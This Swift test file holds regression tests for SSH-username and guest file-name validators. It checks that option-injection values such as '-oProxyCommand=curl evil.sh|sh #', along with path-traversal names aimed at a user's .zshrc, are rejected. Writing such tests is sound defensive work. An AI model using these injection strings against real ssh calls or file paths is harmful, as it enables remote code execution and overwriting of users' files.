import Foundation
import Testing
@testable import bromure_ac

// Regression tests for two guest/peer → host injection findings:
//  H1: a crafted guest file-listing name could steer FileBrowserModel's
//      download cache writes outside the cache root (path traversal).
//  H2: a peer-published `sshUsername` reached an ssh argv unvalidated —
//      a value like `-oProxyCommand=…` is parsed by ssh as an option (RCE).

@Suite("SSH username validation")
@MainActor
struct SSHUserValidationTests {

    @Test("ordinary logins pass, including user@realm form")
    func validNames() {
        #expect(RemoteHost.isValidSSHUser("ubuntu"))
        #expect(RemoteHost.isValidSSHUser("_admin"))
        #expect(RemoteHost.isValidSSHUser("jane.doe"))
        #expect(RemoteHost.isValidSSHUser("build-agent"))
        #expect(RemoteHost.isValidSSHUser("user@EXAMPLE.COM"))
        #expect(RemoteHost.isValidSSHUser("a@b"))
    }

    @Test("option-injection shapes are rejected")
    func injectedNames() {
        #expect(!RemoteHost.isValidSSHUser("-oProxyCommand=curl evil.sh|sh #"))
        #expect(!RemoteHost.isValidSSHUser("-oFoo"))
        #expect(!RemoteHost.isValidSSHUser("-"))
        #expect(!RemoteHost.isValidSSHUser(""))
        #expect(!RemoteHost.isValidSSHUser("user name"))
        #expect(!RemoteHost.isValidSSHUser("user\tname"))
        #expect(!RemoteHost.isValidSSHUser("user/name"))
        #expect(!RemoteHost.isValidSSHUser("user=name"))
        #expect(!RemoteHost.isValidSSHUser("user;id"))
        #expect(!RemoteHost.isValidSSHUser("usér"))
        #expect(!RemoteHost.isValidSSHUser(String(repeating: "a", count: 65)))
    }

    @Test("sshDestination is nil for unsafe user or address")
    func destinationGuard() {
        let good = RemoteHost(name: "m", address: "10.0.0.2", user: "ops@corp")
        #expect(good.sshDestination == "ops@corp@10.0.0.2")

        let badUser = RemoteHost(name: "m", address: "10.0.0.2", user: "-oProxyCommand=id")
        #expect(badUser.sshDestination == nil)

        let badAddress = RemoteHost(name: "m", address: "-oProxyCommand=id", user: "ops")
        #expect(badAddress.sshDestination == nil)

        let emptyAddress = RemoteHost(name: "m", address: "", user: "ops")
        #expect(emptyAddress.sshDestination == nil)
    }

    @Test("a poisoned peer-published username never becomes the dial user")
    func peerHostSanitizesPublishedName() {
        let peerID = "test-peer-\(UUID().uuidString)"
        let device = DeviceInfo(id: peerID, name: "Evil Mac", capability: "server",
                                revoked: false, online: true, lastSeenAt: nil,
                                isSelf: false, sshUsername: "-oProxyCommand=curl evil.sh|sh #")
        let host = RemoteConnectModel.peerHost(for: device)
        #expect(host.user != "-oProxyCommand=curl evil.sh|sh #")
        // Falls through to the local login (no remembered user for this id).
        #expect(host.user == NSUserName())
    }

    @Test("a valid peer-published username (incl. @) is kept")
    func peerHostKeepsValidPublishedName() {
        let peerID = "test-peer-\(UUID().uuidString)"
        let device = DeviceInfo(id: peerID, name: "Studio Mac", capability: "server",
                                revoked: false, online: true, lastSeenAt: nil,
                                isSelf: false, sshUsername: "ops@corp.example")
        #expect(RemoteConnectModel.peerHost(for: device).user == "ops@corp.example")
    }
}

@Suite("Guest file-name validation")
@MainActor
struct GuestFileNameTests {

    @Test("bare filenames pass")
    func validNames() {
        #expect(FileBrowserModel.isSafeGuestName("report.pdf"))
        #expect(FileBrowserModel.isSafeGuestName("some dir"))       // spaces are fine
        #expect(FileBrowserModel.isSafeGuestName("..config"))       // leading dots: filtered as hidden elsewhere, not traversal
    }

    @Test("traversal and separator shapes are rejected")
    func maliciousNames() {
        #expect(!FileBrowserModel.isSafeGuestName(".."))
        #expect(!FileBrowserModel.isSafeGuestName("."))
        #expect(!FileBrowserModel.isSafeGuestName(""))
        #expect(!FileBrowserModel.isSafeGuestName("x/../../../../Users/victim/.zshrc"))
        #expect(!FileBrowserModel.isSafeGuestName("../.."))
        #expect(!FileBrowserModel.isSafeGuestName("a\\..\\b"))
        #expect(!FileBrowserModel.isSafeGuestName("a\0b"))
    }
}
